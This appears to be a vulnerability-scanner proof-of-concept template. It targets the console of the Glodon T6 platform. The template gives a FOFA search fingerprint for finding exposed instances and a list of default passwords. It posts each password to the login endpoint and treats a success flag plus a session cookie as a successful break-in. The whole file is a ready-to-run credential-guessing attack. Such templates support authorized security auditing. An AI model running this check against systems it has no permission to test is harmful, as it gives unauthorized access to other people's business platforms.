id: poc-yaml-glodon-t6-platform-weak-password
info:
  name: 广联达T6平台 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: 广联达T6平台
  fofa: body="GTPESign_Console.js"
variables:
  passwd: 'admin

    123456

    admin123

    '
firstRequest:
  method: GET
  path: /Console/Account/LogOn
  expression: status_code == 200 && contains(body,"GTPESign_Console.js")
requests:
- method: POST
  path: /Console/Account/LogOn
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: pws={{.passwd}}
  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"\"url\":\"/Console/Home/Index\"")
    && contains(headers,"ConsoleLogOn=")
transport: http
